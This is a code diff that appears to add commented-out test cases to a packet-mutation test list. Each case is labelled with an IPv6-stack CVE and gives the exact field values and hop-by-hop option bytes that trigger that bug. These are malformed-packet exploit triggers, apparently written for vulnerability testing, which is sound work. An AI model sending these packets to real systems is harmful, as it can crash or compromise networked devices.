@@ -114,6 +114,143 @@ test_cases = [
                 ]
             }
         ]
-    }
+    },
+    # {
+    #     "name": "CVE-2020-17442",
+    #     "mutations": [
+    #         {
+    #             "field": "payload_length",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x001C
+    #             ]
+    #         },
+    #         {
+    #             "field": "next_header",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x00
+    #             ]
+    #         },
+    #         {
+    #             "field": "hop-by-hop",
+    #             "operation": "insert",
+    #             "values": [
+    #                 "0x06000000000000000000000000000000"
+    #             ]
+    #         }
+    #     ]
+    # },
+    # {
+    #     "name": "CVE-2020-17444",
+    #     "mutations": [
+    #         {
+    #             "field": "payload_length",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x0024
+    #             ]
+    #         },
+    #         {
+    #             "field": "next_header",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x3C
+    #             ]
+    #         },
+    #         {
+    #             "field": "hop-by-hop",
+    #             "operation": "insert",
+    #             "values": [
+    #                 "0x000100000000000000000000000000002CFF000000000000"
+    #             ]
+    #         }
+    #     ]
+    # },
+    # {
+    #     "name": "CVE-2020-17445",
+    #     "mutations": [
+    #         {
+    #             "field": "payload_length",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x0022
+    #             ]
+    #         },
+    #         {
+    #             "field": "next_header",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x3C
+    #             ]
+    #         },
+    #         {
+    #             "field": "hop-by-hop",
+    #             "operation": "insert",
+    #             "values": [
+    #                 "0x06000000000000000000000000000000"
+    #             ]
+    #         }
+    #     ]
+    # },
+    # {
+    #     "name": "CVE-2021-33304",
+    #     "mutations": [
+    #         {
+    #             "field": "payload_length",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x0020
+    #             ]
+    #         },
+    #         {
+    #             "field": "next_header",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x2C
+    #             ]
+    #         },
+    #         {
+    #             "field": "hop-by-hop",
+    #             "operation": "insert",
+    #             "values": [
+    #                 "0x9200000000000000"
+    #             ]
+    #         }
+    #     ]
+    # },
+    # {
+    #     "name": "CVE-2022-36053",
+    #     "mutations": [
+    #         {
+    #             "field": "payload_length",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x001C
+    #             ]
+    #         },
+    #         {
+    #             "field": "next_header",
+    #             "operation": "replace",
+    #             "values": [
+    #                 0x00
+    #             ]
+    #         },
+    #         {
+    #             "field": "hop-by-hop",
+    #             "operation": "insert",
+    #             "values": [
+    #                 "0x9200000000000000"
+    #             ]
+    #         },
+    #         {
+    #             "field": "truncate",
+    #             "operation": "truncate",
+    #             "values": [
+    #                 "47"
+    #             ]
+    #         }
+    #     ]
+    # }
 ]
 
